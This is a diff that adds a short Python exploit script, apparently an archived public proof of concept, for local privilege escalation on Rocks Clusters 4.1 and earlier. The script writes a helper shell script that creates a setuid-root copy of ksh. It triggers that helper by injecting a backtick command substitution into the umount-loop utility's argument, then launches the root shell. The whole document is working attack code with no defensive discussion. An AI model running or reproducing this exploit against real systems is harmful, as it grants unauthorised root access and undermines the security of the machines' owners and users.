@@ -1,0 +1,12 @@
+#!/usr/bin/env python
+##############################################################################
+##  rocksumountdirty.py: Rocks release &lt;=4.1 local root exploit
+##  quick and nasty version of the exploit. make sure the . is writable and
+##  you clean up afterwards. ;)
+##
+##  coded by: xavier@tigerteam.se [http://xavsec.blogspot.com]
+##############################################################################
+x=__import__(&#039;os&#039;);c=x.getcwd()
+open(&#039;%s/x&#039;%c, &#039;a&#039;).write(&quot;#!/bin/sh\ncp /bin/ksh %s/shell\nchmod a+xs %s/shell\nchown root.root %s/shell\n&quot; % (c,c,c))
+print &quot;Rocks Clusters &lt;=4.1 umount-loop local root exploit by xavier@tigerteam.se [http://xavsec.blogspot.com]&quot;
+x.system(&#039;umount-loop &quot;\`sh %s/x\`&quot;&#039;%c);x.system(&quot;%s/shell&quot;%c)
